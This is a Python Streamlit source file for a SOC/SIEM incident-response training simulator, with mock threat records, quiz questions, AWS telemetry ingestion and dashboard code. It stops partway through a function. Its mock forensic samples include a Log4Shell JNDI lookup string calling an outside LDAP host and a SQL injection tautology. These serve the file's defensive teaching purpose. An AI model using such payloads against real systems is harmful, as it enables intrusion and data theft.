import pandas as pd
import streamlit as st
import random
import base64
import os
import pydeck as pdk
import json
from urllib.request import urlopen
from datetime import datetime
from zoneinfo import ZoneInfo
import time
from google import genai
import boto3
import plotly.express as px


# --- TACTICAL DATA MODELS ---
MOCK_THREAT_POOL = [
    {
        "ID": "TR-1001", "Severity": "Low", "Source": "Edge-Sec", "Vector": "Phishing Attempt", "Status": "Active", "lat": 34.0522, "lon": -118.2437, "MITRE": "T1566.001", "CVE": "N/A",
        "Playbook": ["Block Sender", "Quarantine Mail", "Ignore"], "Correct": "Quarantine Mail", 
        "DistractorExplanations": {"Block Sender": "Insufficient. The payload is already in the inbox.", "Ignore": "High risk of credential theft."},
        "Hint": "Isolate the delivery vector immediately.",
        "Steps": ["1. Purge mail from all inboxes", "2. Block sender domain at gateway", "3. Force password reset for recipient."],
        "Insight": "Entry-level phishing simulation: suspicious .zip link detected in HR mail queue.",
        "Forensics": {
            "type": "JSON_LOG",
            "data": {
                "email_headers": "From: accounts-verify@paypa1-support.com\nSubject: Critical Security Alert\nX-Mailer: PHPMailer 5.2.1",
                "attachment_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
            }
        },
        "ReportQuestions": ["Identify the malicious URL or attachment name:", "How many users interacted with the email?", "What specific indicators of compromise (IOCs) were found?"]
    },
    {
        "ID": "TR-1002", "Severity": "Medium", "Source": "Intra-Probe", "Vector": "Internal Network Scan", "Status": "Active", "lat": 35.6762, "lon": -139.6503, "MITRE": "T1046", "CVE": "N/A", 
        "Playbook": ["Disable Port", "Quarantine Host", "Audit Logs"], "Correct": "Quarantine Host",
        "DistractorExplanations": {"Disable Port": "Too narrow. Attacker will switch ports.", "Audit Logs": "Good for forensics, but doesn't stop the live scan."},
        "Hint": "Stop the reconnaissance phase by isolating the source machine.",
        "Steps": ["1. Move host to isolation VLAN", "2. Terminate scanning process", "3. Snapshot disk for analysis."],
        "Insight": "Intermediate scan detected. Unauthorized Nmap activity from developer workstation.",
        "Forensics": {
            "type": "PCAP_SNIPPET",
            "data": "IP 192.168.1.45.54212 > 192.168.1.1.80: Flags [S], seq 12345, win 64240\nIP 192.168.1.45.54213 > 192.168.1.1.443: Flags [S], seq 67890, win 64240"
        },
        "ReportQuestions": ["Identify the source IP and scanning tool used:", "List critical assets probed during the scan:", "Provide firewall rule recommendations to prevent recurrence:"]
    },
    {
        "ID": "TR-1081", "Severity": "Critical", "Source": "Suricata", "Vector": "Log4Shell RCE", "Status": "Active", "lat": 51.5074, "lon": -0.1278, "MITRE": "T1190", "CVE": "CVE-2021-44228", 
        "Playbook": ["Disable JNDI", "Patch Log4j", "WAF Filter"], "Correct": "Patch Log4j", 
        "DistractorExplanations": {"Disable JNDI": "Suboptimal. The library remains on disk and can be bypassed.", "WAF Filter": "Ineffective against nested polymorphic lookups."},
        "Hint": "Look for the remediation that targets the library version itself.",
        "Steps": ["1. Identify vulnerable JARs", "2. Update to Log4j 2.17+", "3. Restart JVM."],
        "Insight": "Polymorphic payload detected. Obfuscated strings observed bypassing EDR.",
        "Forensics": {
            "type": "JSON_LOG",
            "data": {
                "http_method": "GET",
                "user_agent": "${jndi:ldap://104.248.x.x:1389/a}",
                "path": "/api/v1/auth"
            }
        },
        "ReportQuestions": ["Identify the malicious JNDI string used in the exploit:", "Confirm the library and patch versions involved:", "Was there evidence of data exfiltration following the RCE?"]
    },
    {
        "ID": "TR-1084", "Severity": "Critical", "Source": "Darktrace", "Vector": "MOVEit Transfer Exfil", "Status": "Active", "lat": 40.7128, "lon": -74.0060, "MITRE": "T1190", "CVE": "CVE-2023-34362", 
        "Playbook": ["Disable SFTP", "Rotate DB Keys", "IP Blocklist"], "Correct": "IP Blocklist",
        "DistractorExplanations": {"Disable SFTP": "Too slow. Data is already leaving via HTTPS.", "Rotate DB Keys": "Doesn't stop the current exfiltration stream."},
        "Hint": "We need an immediate network block on the egress destination.",
        "Steps": ["1. Block Source IP at Firewall", "2. Quarantining File Server", "3. Audit SFTP Logs."],
        "Insight": "Zero-day SQL injection in progress. High-volume data exfiltration detected.",
        "Forensics": {
            "type": "SQL_AUDIT",
            "data": "SELECT * FROM guest_users WHERE id = '' OR '1'='1'; --\nUPDATE moveit_files SET status = 'EXFIL_PENDING' WHERE size > 100MB"
        },
        "ReportQuestions": ["Estimated volume of data exfiltrated during the event:", "List the destination IPs associated with the exfiltration:", "Confirm the specific CVE and entry point exploited:"]
    },
    {
        "ID": "TR-1089", "Severity": "Critical", "Source": "GuardDuty", "Vector": "Citrix Bleed", "Status": "Active", "lat": 1.3521, "lon": 103.8198, "MITRE": "T1190", "CVE": "CVE-2023-4966", 
        "Playbook": ["Clear Sessions", "Update NetScaler", "Kill Active VPN"], "Correct": "Update NetScaler",
        "DistractorExplanations": {"Clear Sessions": "Temporary. The exploit can be re-run immediately.", "Kill Active VPN": "Does not address the vulnerability in the NetScaler appliance."},
        "Hint": "The vulnerability lies in the appliance memory handling.",
        "Steps": ["1. Apply NetScaler firmware patch", "2. Force password reset", "3. Clear all active sessions."],
        "Insight": "Information disclosure vulnerability allowing session hijacking without credentials.",
        "Forensics": {
            "type": "MEM_DUMP_STRINGS",
            "data": "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1\nHost: citrix.internal\nCookie: session=....[OVERSHARED DATA BUFFER CONTENT]...."
        },
        "ReportQuestions": ["Identify the detection method used to identify the hijacked session:", "List the impacted user accounts found in the audit:", "Verify that all active sessions were cleared after firmware patching:"]
    }
]

IR_PHASE_CHALLENGES = {
    1: {"q": "What tool helps determine if this binary has been seen globally?", "options": ["Nmap", "VirusTotal", "Wireshark"], "correct": "VirusTotal", "exp": "VirusTotal aggregates antivirus scans and provides global reputation data for files/hashes."},
    2: {"q": "How do we effectively isolate the endpoint without alerting the adversary?", "options": ["Physical Disconnect", "VLAN Quarantine", "Shutdown OS"], "correct": "VLAN Quarantine", "exp": "VLAN quarantine maintains the host's state for forensics while cutting lateral movement paths."},
    3: {"q": "Which artifact is most volatile and must be secured first?", "options": ["System Logs", "RAM Dump", "Disk Image"], "correct": "RAM Dump", "exp": "Memory is highly volatile. Data like encryption keys and running processes disappear if power is lost."},
    4: {"q": "Who is the primary point of contact for a confirmed PII breach?", "options": ["Lead Developer", "Privacy/DPO Officer", "Help Desk"], "correct": "Privacy/DPO Officer", "exp": "GDPR/Compliance requires immediate notification to the Data Protection Officer."},
    5: {"q": "Before applying a vendor patch, what must be completed?", "options": ["Reboot Host", "Sandbox Testing", "Notify Users"], "correct": "Sandbox Testing", "exp": "Testing patches in a sandbox ensures they won't cause system instability in production."},
    6: {"q": "How do we verify the threat hasn't returned after restoration?", "options": ["Continuous Monitoring", "Ask User", "One-time Scan"], "correct": "Continuous Monitoring", "exp": "Real-time EDR/NDR monitoring is required to ensure no persistent backdoors remain active."},
    7: {"q": "What is the primary goal of a Post-Incident Review?", "options": ["Assign Blame", "Improve Controls", "Close Ticket"], "correct": "Improve Controls", "exp": "The objective is to identify process gaps and strengthen the defense posture for future events."}
}

@st.cache_data(ttl=86400)
def fetch_global_intel_feed():
    """
    Autonomous Intel Fetcher: Retrieves daily cyber threat landscape news.
    Cached for 24 hours (86400s) to optimize API overhead and ensure daily updates.
    """
    # Baseline feed for the framework; in production, this targets RSS or News APIs.
    return [
        {
            "source": "CISA", 
            "title": f"Advisory {datetime.now().strftime('%Y-%m-%d')}: Critical Infrastructure Protection", 
            "severity": "High", 
            "url": "https://www.cisa.gov/news-events/cybersecurity-advisories"
        },
        {
            "source": "BleepingComputer", 
            "title": "New High-Severity Vulnerabilities Exploited in Enterprise VPNs", 
            "severity": "Critical", 
            "url": "https://www.bleepingcomputer.com/"
        },
        {
            "source": "SANS ISC", "title": "Handler's Diary: New Obfuscation Techniques in Malware Payloads", "severity": "Medium", "url": "https://isc.sans.edu/"
        }
    ]


def perform_system_hygiene() -> None:
    """Automated garbage collector for platform efficiency and security."""
    if 'last_hygiene' not in st.session_state:
        st.session_state.last_hygiene = time.time()
    
    # Run hygiene every 10 minutes or on command
    if time.time() - st.session_state.last_hygiene > 600:
        st.cache_data.clear()
        # Prune chat history to prevent memory pressure
        if len(st.session_state.chat_history) > 20:
            st.session_state.chat_history = st.session_state.chat_history[-10:]
        st.session_state.last_hygiene = time.time()
        st.sidebar.info("System Hygiene: Cache Optimized.")


logo_path = os.path.join(os.path.dirname(__file__), "securex.png")
if not os.path.exists(logo_path):
    logo_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "securex.png")

st.set_page_config(
    page_title="SECUREX COMMAND SIEM/SOAR/SOC Simulator",
    page_icon=logo_path if os.path.exists(logo_path) else "🛡️",
    layout="wide",
)


def inject_custom_css(breach_active: bool = False) -> None:
    alert_style = '.stApp { animation: alert-flash 1.5s infinite !important; } @keyframes alert-flash { 0%, 100% { background-color: #000000; } 50% { background-color: #001a00; } }' if breach_active else ''
    ai_breach_style = '.ai-analyst-box { border: 2px solid #00FF00 !important; box-shadow: 0 0 30px rgba(0, 255, 0, 0.2) !important; transform: scale(1.02); transition: all 0.5s ease; }' if breach_active else ''
    map_flash = '.map-container { animation: map-pulse-border 1s infinite !important; border: 2px solid #00FF00 !important; } @keyframes map-pulse-border { 0%, 100% { box-shadow: 0 0 5px #00FF00; } 50% { box-shadow: 0 0 25px #00FF00; } }' if breach_active else ''
    spin_speed = "5s" if breach_active else "20s"
    st.markdown("""
        <style>
        .stApp {
            background: 
                radial-gradient(circle at 50% 50%, #05080a 0%, #000000 100%) !important;
            background-attachment: fixed !important;
            color: #FFFFFF !important;
        }
        [data-testid="stSidebar"] {
            background-color: rgba(5, 8, 12, 0.8) !important;
            backdrop-filter: blur(12px);
            border-right: 1px solid rgba(0, 255, 0, 0.1) !important;
        }
        [data-testid="stSidebar"] label p {
            color: #FFFFFF !important;
            font-family: 'Courier New', monospace !important;
        }
        .analyst-terminal {
            background: rgba(0, 10, 0, 0.95);
            border: 1px solid #00FF00;
            padding: 15px;
            font-family: 'Courier New', monospace;
            color: #00FF00;
            height: 250px;
            overflow-y: auto;
            margin-bottom: 20px;
            box-shadow: inset 0 0 15px rgba(0, 255, 0, 0.2);
        }
        .stApp::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 0, 0.015) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 0, 0.015) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 0;
        }
        
        h1, h2, h3, p, span, div {
            font-family: 'Courier New', monospace !important;
        }
        
        @keyframes pulse-green {
            0% { transform: scale(0.98); opacity: 0.5; box-shadow: 0 0 4px #00FF00; }
            50% { transform: scale(1.05); opacity: 1; box-shadow: 0 0 14px #00FF00; }
            100% { transform: scale(0.98); opacity: 0.5; box-shadow: 0 0 4px #00FF00; }
        }
        .status-pulse-commander {
            height: 10px;
            width: 10px;
            background-color: #00FF00;
            border-radius: 50%;
            display: inline-block;
            margin-right: 12px;
            animation: pulse-green 1.8s infinite ease-in-out;
        }

        .globe-texture { 
            animation: globe-spin """ + spin_speed + """ linear infinite !important; 
            opacity: 0.4; 
        }
        @keyframes globe-spin { 
            0% { transform: translateX(0); } 100% { transform: translateX(-400px); } 
        }

        @keyframes map-pulse {
            0% { r: 4; opacity: 1; }
            100% { r: 12; opacity: 0; }
        }
        .map-node-pulse {
            animation: map-pulse 2s infinite;
            fill: #00D1FF;
        }
        @keyframes dash-move {
            to { stroke-dashoffset: -20; }
        }
        .map-connection {
            stroke: #00D1FF;
            stroke-width: 1;
            stroke-dasharray: 4, 2;
            animation: dash-move 1s linear infinite;
            opacity: 0.3;
        }

        .risk-metric-card {
            background: #000000;
            border: 1px solid rgba(0, 255, 0, 0.2);
            padding: 15px;
            text-align: center;
        }
        .risk-label { font-size: 0.65rem; color: #777777; letter-spacing: 2px; text-transform: uppercase; }
        .risk-value { font-size: 1.8rem; font-weight: bold; color: #00FF00; margin-top: 5px; }

        .research-btn {
            display: inline-block;
            padding: 5px 10px;
            background: #FFFFFF;
            border: 1px solid #00FF00;
            color: #000000 !important;
            text-decoration: none;
            font-size: 0.7rem;
            margin-right: 5px;
        }
        
        .pipeline-card {
            background: rgba(5, 5, 5, 0.6);
            backdrop-filter: blur(5px);
            padding: 10px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-left: 3px solid #00FF00;
            margin-bottom: 12px;
        }
        .pipeline-name {
            font-weight: bold;
            font-size: 0.85rem;
            color: #FFFFFF;
            letter-spacing: 1px;
        }
        .metric-value {
            color: #00FF00;
            font-weight: bold;
        }
        .secondary-text {
            color: #777777;
            font-size: 0.75rem;
        }
        
        div[data-testid="stMetric"], div.stMetric {
            background-color: rgba(0, 0, 0, 0.4) !important;
            border: 1px solid rgba(0, 255, 0, 0.05) !important;
            padding: 20px !important;
            border-radius: 2px !important;
        }
        [data-testid="stMetricValue"] > div, .stMetricValue, .stMetricValue div {
            color: #00FF00 !important;
            font-family: 'Courier New', monospace !important;
            font-size: 2.2rem !important;
        }
        [data-testid="stMetricLabel"] > div, .stMetricLabel, .stMetricLabel div {
            color: #FFFFFF !important;
            letter-spacing: 1px !important;
            text-transform: uppercase !important;
        }
        @media (max-width: 768px) {
            .header-container { flex-direction: column !important; align-items: center !important; text-align: center !important; gap: 25px !important; width: 100% !important; }
            .logo-img { margin-right: 0 !important; margin-bottom: 15px !important; height: 90px !important; max-width: 100% !important; }
            .header-metrics { flex-direction: column !important; gap: 20px !important; align-items: center !important; width: 100% !important; justify-content: center !important; }
            .header-metrics > div { text-align: center !important; margin: 0 auto !important; }
            .ai-content-wrapper { flex-direction: column !important; gap: 25px !important; }
            .risk-score-box { width: 100% !important; border-left: none !important; border-top: 1px solid rgba(0, 255, 0, 0.2) !important; padding: 20px 0 0 0 !important; }
            .stMetric { width: 100% !important; }
            .map-container { height: 400px !important; }
        }
        /* Button and Option Visibility Hardening */
        div.stButton > button, div[data-testid="stRadio"] label {
            background-color: #FFFFFF !important;
            color: #000000 !important;
            border: 1px solid #00FF00 !important;
            font-weight: bold !important;
        }
        div.stButton > button:hover, div[data-testid="stRadio"] label:hover {
            background-color: #00FF00 !important;
            color: #000000 !important;
            cursor: pointer;
        }
        /* High-Contrast Input Visibility */
        div[data-testid="stTextInput"] input, div[data-testid="stTextArea"] textarea {
            background-color: #FFFFFF !important;
            color: #000000 !important;
            border: 1px solid #00FF00 !important;
            font-family: 'Courier New', monospace !important;
        }
        """ + alert_style + """
        """ + ai_breach_style + """
        """ + map_flash + """
        </style>
    """, unsafe_allow_html=True)


def get_ai_engine_metrics() -> dict:
    """Provides tactical telemetry for the AI Charlie SLM Engine."""
    return {
        "inference_ms": random.randint(45, 120),
        "model_confidence": f"{random.uniform(94.2, 99.8):.1f}%",
        "neural_link": "STABLE"
    }


def get_cloudwatch_telemetry() -> list:
    """Queries CloudWatch Logs Insights for tactical threat telemetry."""
    if "AWS_ACCESS_KEY_ID" not in st.secrets:
        return []
    
    try:
        logs = boto3.client(
            'logs',
            aws_access_key_id=st.secrets["AWS_ACCESS_KEY_ID"],
            aws_secret_access_key=st.secrets["AWS_SECRET_ACCESS_KEY"],
            region_name=st.secrets.get("AWS_DEFAULT_REGION", "eu-central-1")
        )
        
        log_group = st.secrets.get("CLOUDWATCH_LOG_GROUP", "/aws/soc/threats")
        query = (
            "fields @timestamp, id, severity, source, vector, lat, lon, mitre, cve, insight "
            "| filter severity = 'Critical' or severity = 'High' "
            "| sort @timestamp desc "
            "| limit 10"
        )
        
        start_query_response = logs.start_query(
            logGroupName=log_group,
            startTime=int((datetime.now().timestamp() - 3600)), # Last 60 mins
            endTime=int(datetime.now().timestamp()),
            queryString=query,
        )
        
        query_id = start_query_response['queryId']
        # Poll for results with status awareness
        for _ in range(10): # Increased polling attempts
            response = logs.get_query_results(queryId=query_id)
            if response.get('status') in ['Complete', 'Failed', 'Cancelled']:
                break
            time.sleep(0.5)
        
        if response.get('status') != 'Complete':
            st.error(f"CloudWatch query did not complete. Status: {response.get('status')}")
            return []

        parsed_logs = []
        for result in response.get('results', []):
            # Map list of dicts to a single dict
            entry = {field['field']: field['value'] for field in result}
            parsed_logs.append({
                "ID": entry.get("id", "CW-LOG"),
                "Severity": entry.get("severity", "Medium"),
                "Source": entry.get("source", "CloudWatch"),
                "Vector": entry.get("vector", "Unidentified Traffic"),
                "Status": "Active",
                "lat": float(entry.get("lat", 0)),
                "lon": float(entry.get("lon", 0)),
                "MITRE": entry.get("mitre", "N/A"),
                "CVE": entry.get("cve", "N/A"),
                "Insight": entry.get("insight", "Log data ingested from AWS CloudWatch."),
                "Time": entry.get("@timestamp", "").split(" ")[1].split(".")[0], # Format to HH:MM:SS
                "Playbook": ["Block IP", "Isolate VPC", "Audit Logs"], # Default remediation
                "Correct": "Block IP"
            })
        return parsed_logs
    except Exception as e:
        return []


def get_active_threats_data() -> pd.DataFrame:
    local_data = []
    
    # S3 Telemetry Ingestion Logic
    s3 = get_aws_client('s3')
    if s3:
        try:
            s3_bucket = st.secrets.get("S3_BUCKET_NAME")
            if not s3_bucket:
                st.error("S3_BUCKET_NAME not found in Streamlit secrets.")
                return []
            response = s3.get_object(Bucket=s3_bucket, Key="telemetry.json")
            local_data = json.loads(response['Body'].read().decode('utf-8'))
        except Exception as e:
            pass
    
    # Fallback to local file if S3 fetch fails or isn't configured
    if not local_data:
        telemetry_path = os.path.join(os.path.dirname(__file__), "telemetry.json")
        if os.path.exists(telemetry_path):
            try:
                with open(telemetry_path, "r") as f:
                    local_data = json.load(f)
            except Exception:
                pass

    # Aggregate real-world CloudWatch telemetry with static pool
    cw_data = get_cloudwatch_telemetry()
    
    return pd.DataFrame(cw_data + local_data + MOCK_THREAT_POOL)


def get_pipeline_status_data() -> pd.DataFrame:
    return pd.DataFrame([
        {"Pipeline": "Terraform Engine", "Status": "ACTIVE"},
        {"Pipeline": "Ansible Automation", "Status": "ACTIVE"},
        {"Pipeline": "Docker Runtime", "Status": "ACTIVE"},
        {"Pipeline": "Kubernetes Cluster", "Status": "ACTIVE"}
    ])


@st.cache_data
def get_base64_logo(file_path: str) -> str:
    if os.path.exists(file_path):
        with open(file_path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    return ""


def render_header(threat_count: int = 0, assets_count: int = 0) -> None:
    logo_b64 = get_base64_logo(logo_path)
    logo_html = f'<img class="logo-img" src="data:image/png;base64,{logo_b64}" style="height:100px;margin-right:25px;vertical-align:middle;filter:drop-shadow(0 0 15px #00FF00);">' if logo_b64 else ""
    
    header_html = f'<div class="header-container" style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;margin-bottom:30px;border-bottom:1px solid #1A1A1A;padding-bottom:20px;width:100%;"><div style="display:flex;align-items:center;flex-wrap:wrap;justify-content:center;">{logo_html}<div><h1 style="margin:0;font-family:\'Courier New\',monospace;font-size:2.2rem;font-weight:900;letter-spacing:4px;color:#00FF00;">SECUREX COMMAND SIEM/SOAR/SOC Simulator</h1><p style="color:#FFFFFF;margin:5px 0 0 0;font-size:0.85rem;letter-spacing:1px;">[ SYSTEM INFRASTRUCTURE MONITORING V1.0 ]</p></div></div><div class="header-metrics" style="display:flex;gap:40px;align-items:center;flex-wrap:wrap;justify-content:center;"><div style="text-align:right;"><div style="color:#FFFFFF;font-size:0.65rem;letter-spacing:1px;">THREATS TODAY</div><div style="color:#00FF00;font-weight:bold;font-size:1.2rem;">{threat_count}</div></div><div style="text-align:right;"><div style="color:#FFFFFF;font-size:0.65rem;letter-spacing:1px;">ASSETS MONITORED</div><div style="color:#FFFFFF;font-weight:bold;font-size:1.2rem;">{assets_count:,}</div></div><div style="background:#000000;border:1px solid #00FF00;padding:8px 15px;"><span class="status-pulse-commander"></span><span style="color:#00FF00;font-weight:bold;font-size:0.8rem;letter-spacing:2px;font-family:\'Courier New\',monospace;">COMMAND CENTER ACTIVE</span></div></div></div>'
    st.markdown(header_html, unsafe_allow_html=True)


def render_ai_engine_telemetry() -> None:
    ai_stats = get_ai_engine_metrics()
    st.markdown("<p style='color: #FFFFFF; margin: 0 0 10px 0; font-size: 0.7rem; letter-spacing: 2px;'>// AI ANALYST ENGINE TELEMETRY</p>", unsafe_allow_html=True)
    c1, c2, c3 = st.columns(3)
    c1.metric("Inference Latency", f"{ai_stats['inference_ms']}ms")
    c2.metric("Model Confidence", ai_stats['model_confidence'])
    c3.metric("Neural Link", ai_stats['neural_link'])


def render_active_threats() -> None:
    """Renders the live telemetry feed with safety scope checks."""
    threat_log = st.session_state.get('threat_log', []) or []
    
    st.markdown("<p style='color: #FFFFFF; margin: 0 0 10px 0; font-size: 0.7rem;'>// LIVE THREAT FEED</p>", unsafe_allow_html=True)

    if not threat_log or len(threat_log) == 0:
        st.markdown("<p style='color: #777777; font-size: 0.8rem;'>ALL THREATS NEUTRALIZED. SECTOR CLEAR.</p>", unsafe_allow_html=True)
        return

    for row in threat_log:
        severity_color = {"Critical": "#00FF00", "High": "#FFFFFF", "Medium": "#777777", "Low": "#444444"}.get(row["Severity"], "#222222")

        mitre_id = str(row.get("MITRE", ""))
        cve_id = str(row.get("CVE", ""))
        
        # MITRE sub-techniques (e.g. T1566.001) require a slash in the URL: techniques/T1566/001/
        mitre_url_path = mitre_id.replace(".", "/")
        mitre_link = f'<a href="https://attack.mitre.org/techniques/{mitre_url_path}/" target="_blank" style="color:#00FF00;text-decoration:none;">{mitre_id}</a>' if "T" in mitre_id else mitre_id
        cve_link = f'<a href="https://nvd.nist.gov/vuln/detail/{cve_id}" target="_blank" style="color:#00FF00;text-decoration:none;">{cve_id}</a>' if "CVE" in cve_id.upper() else cve_id

        threat_html = f'<div style="margin-bottom:12px;border-left:2px solid {severity_color};padding-left:10px;"><div style="font-size:0.75rem;color:#FFFFFF;">[{row["Time"]}] <span style="color:{severity_color};">{row["Source"]}</span></div><div style="font-size:0.8rem;color:#FFFFFF;font-weight:bold;">{row["Vector"]}</div><div style="font-size:0.7rem;color:#00FF00;margin-top:2px;font-family:\'Courier New\',monospace;">{mitre_link} | {cve_link}</div></div>'
        st.markdown(threat_html, unsafe_allow_html=True)
        
        if st.button(f"ANALYZE: {row['ID']}", key=f"feed_{row['ID']}", use_container_width=True):
            st.session_state.remediation_target = row
            st.rerun()


def render_anomaly_map(zoom_lat=None, zoom_lon=None) -> None:
    """Renders the pydeck geospatial engine in the center command column."""
    st.markdown("<p style='color: #FFFFFF; margin: 0 0 10px 0; font-size: 0.7rem; letter-spacing: 2px;'>// GEOSPATIAL TELEMETRY</p>", unsafe_allow_html=True)

    try:
        response = urlopen('https://ip-api.com/json', timeout=5)
        data = json.load(response)
        curr_lat, curr_lon = data['lat'], data['lon']
    except:
        curr_lat, curr_lon = 51.5074, -0.1278

    threat_log = st.session_state.get('threat_log', []) or []
    threats_df = pd.DataFrame(threat_log)
    
    view_lat = zoom_lat if zoom_lat else curr_lat
    view_lon = zoom_lon if zoom_lon else curr_lon
    zoom_level = 10 if zoom_lat else 2

    if not threats_df.empty:
        threats_df['target_lat'] = curr_lat
        threats_df['target_lon'] = curr_lon
    
    scatterplot = pdk.Layer(
        "ScatterplotLayer",
        threats_df,
        get_position=["lon", "lat"],
        get_color="[0, 255, 0, 160]",
        get_radius=150000,
        pickable=True
    )
    arclayer = pdk.Layer(
        "ArcLayer",
        threats_df,
        get_source_position=["lon", "lat"],
        get_target_position=["target_lon", "target_lat"],
        get_source_color=[0, 255, 0, 80],
        get_target_color=[0, 255, 0, 255],
        get_width=3,
    )
    
    r = pdk.Deck(
        layers=[arclayer, scatterplot],
        initial_view_state=pdk.ViewState(latitude=view_lat, longitude=view_lon, zoom=zoom_level, pitch=45),
        map_style="dark",
        tooltip={
            "html": """
                <b>ID:</b> {ID}<br><b>Vector:</b> {Vector}<br><b>Status:</b> {Status}
            """,
            "style": {"backgroundColor": "transparent", "color": "white", "padding": "0"}
        }
    )
    
    st.pydeck_chart(r)


def render_threat_distribution() -> None:
    """Displays a donut chart of the threat severity distribution from the active log."""
    st.markdown("<p style='color: #FFFFFF; margin: 25px 0 10px 0; font-size: 0.7rem; letter-spacing: 2px;'>// THREAT SEVERITY DISTRIBUTION</p>", unsafe_allow_html=True)
    threat_log = st.session_state.get("threat_log", [])
    
    if not threat_log:
        st.markdown("<p style='color: #777777; font-size: 0.8rem;'>NO DATA FOR DISTRIBUTION ANALYTICS.</p>", unsafe_allow_html=True)
        return

    df = pd.DataFrame(threat_log)
    severity_counts = df['Severity'].value_counts().reset_index()
    severity_counts.columns = ['Severity', 'Count']

    # Mapping colors to match the SECUREX Matrix aesthetic
    color_map = {
        "Critical": "#00FF00", 
        "High": "#FFFFFF", 
        "Medium": "#777777", 
        "Low": "#444444"
    }

    fig = px.pie(
        severity_counts, 
        values='Count', 
        names='Severity',
        hole=0.6,
        color='Severity',
        color_discrete_map=color_map,
        category_orders={"Severity": ["Critical", "High", "Medium", "Low"]}
    )

    fig.update_layout(
        showlegend=False,
        paper_bgcolor='rgba(0,0,0,0)',
        plot_bgcolor='rgba(0,0,0,0)',
        margin=dict(t=0, b=0, l=0, r=0),
        height=200
    )
    fig.update_traces(textposition='inside', textinfo='percent+label')

    # SIEM Interactivity: Enable segment selection to filter the Master Incident Ledger
    selection = st.plotly_chart(
        fig, use_container_width=True, config={'displayModeBar': False}, on_select="rerun", key="threat_distribution_chart"
    )

    # Update global filter state based on donut segment selection
    if selection and selection.get("selection") and selection["selection"].get("points"):
        st.session_state.severity_filter = selection["selection"]["points"][0]["label"]
    else:
        st.session_state.severity_filter = None


def render_threat_velocity() -> None:
    st.markdown("<p style='color: #FFFFFF; margin: 25px 0 10px 0; font-size: 0.7rem; letter-spacing: 2px;'>// THREAT DETECTION VELOCITY</p>", unsafe_allow_html=True)
    timeline = st.session_state.get("threat_timeline", [])
    if not timeline:
        st.markdown("<p style='color: #777777; font-size: 0.8rem;'>NO VELOCITY DATA AVAILABLE.</p>", unsafe_allow_html=True)
        return
    df = pd.DataFrame(timeline, columns=["timestamp"])
    df['minute'] = df['timestamp'].dt.strftime('%H:%M')
    velocity_df = df.groupby('minute').size().reset_index(name='count')
    fig = px.line(velocity_df, x='minute', y='count', markers=True)
    fig.update_traces(
        line_color='#00FF00', 
        marker=dict(size=8, color='#FFFFFF', line=dict(width=2, color='#00FF00'))
    )
    fig.update_layout(
        xaxis_title=None,
        yaxis_title=None,
        paper_bgcolor='rgba(0,0,0,0)',
        plot_bgcolor='rgba(0,0,0,0)',
        margin=dict(t=10, b=10, l=10, r=10),
        height=200,
        font=dict(family="Courier New", color="#777777")
    )
    fig.update_xaxes(showgrid=False, zeroline=False)
    fig.update_yaxes(showgrid=True, gridcolor='rgba(0,255,0,0.1)', zeroline=False)
    st.plotly_chart(fig, use_container_width=True, config={'displayModeBar': False})


@st.dialog("TACTICAL REMEDIATION INTERFACE")
def remediation_dialog(latest):
    """Drill-down window for incident analysis and playbook execution."""
    st.markdown(f"### 🛡️ RESPONDER CONSOLE: {latest.get('Vector')} ({latest.get('ID')})")
    
    col1, col2 = st.columns(2)
    vt_link = f"https://www.virustotal.com/gui/search/{latest.get('CVE', latest.get('Vector'))}"
    abuse_link = f"https://www.abuseipdb.com/check/{latest.get('Source')}"
    col1.markdown(f'<a href="{vt_link}" target="_blank" class="research-btn" style="width:100%; text-align:center;">🔍 VirusTotal Search</a>', unsafe_allow_html=True)
    col2.markdown(f'<a href="{abuse_link}" target="_blank" class="research-btn" style="width:100%; text-align:center;">🛡️ AbuseIPDB Check</a>', unsafe_allow_html=True)

    with st.expander("🛠️ FORENSIC WORKBENCH (RAW DATA)", expanded=False):
        forensics = latest.get("Forensics", {"type": "UNAVAILABLE", "data": "No forensic data available."})
        st.info(f"DATA TYPE: {forensics['type']}")
        if isinstance(forensics['data'], dict):
            st.json(forensics['data'])
        else:
            st.code(forensics['data'], language="bash")
        st.markdown("""<p style="font-size:0.7rem; color:#777777;">Use the raw artifacts above to correlate the Vector with NIST/MITRE intelligence.</p>""", unsafe_allow_html=True)

    step_idx = st.session_state.get('remediation_step', 1)
    phase_names = [
        "1. ANALYSIS / TRIAGE",
        "2. CONTAINMENT",
        "3. PRESERVATION",
        "4. COMMUNICATION",
        "5. ERADICATION",
        "6. RECOVERY",
        "7. LESSONS LEARNED",
        "8. FINAL REMEDIATION"
    ]
    current_phase = phase_names[min(step_idx - 1, len(phase_names) - 1)]

    st.divider()
    st.markdown(f"""
        <div style="background: rgba(0, 20, 0, 0.9); padding: 20px; border: 1px solid #00FF00; font-family: monospace; color: #00FF00;">
            <b style="font-size: 1.1rem;">> IR PHASE: {current_phase}</b> (Step {step_idx} of 8)
        </div>
    """, unsafe_allow_html=True)

    if step_idx < 8:
        st.write(f"### Phase {step_idx} Knowledge Check")
        challenge = IR_PHASE_CHALLENGES.get(step_idx)
        choice = st.radio(f"**Tactical Question**: {challenge['q']}", challenge['options'], key=f"q_step_{step_idx}")
        
        if st.button("CONFIRM PROTOCOL", use_container_width=True):
            if choice == challenge['correct']:
                st.success(f"**CORRECT:** {challenge['exp']}")
                time.sleep(0.5)
                st.session_state.remediation_step += 1
                st.rerun()
            else:
                st.error(f"**INCORRECT:** {challenge['exp']}")
    else:
        st.write("### 🚨 STEP 8: FINAL PLAYBOOK EXECUTION")
        st.info("The incident has been analyzed and isolated. Select the final eradication/recovery playbook action to close the case.")
        for action in latest.get('Playbook', []):
            if st.button(f"INITIATE FINAL FIX: {action}", use_container_width=True):
                if action == latest.get('Correct'):
                    # Correct Playbook Selection: Progress to Step 8 (Case Profile)
                    st.session_state.active_case = latest.copy()
                    st.session_state.remediation_target = None
                    st.session_state.remediation_step = 1
                    st.rerun()
                else:
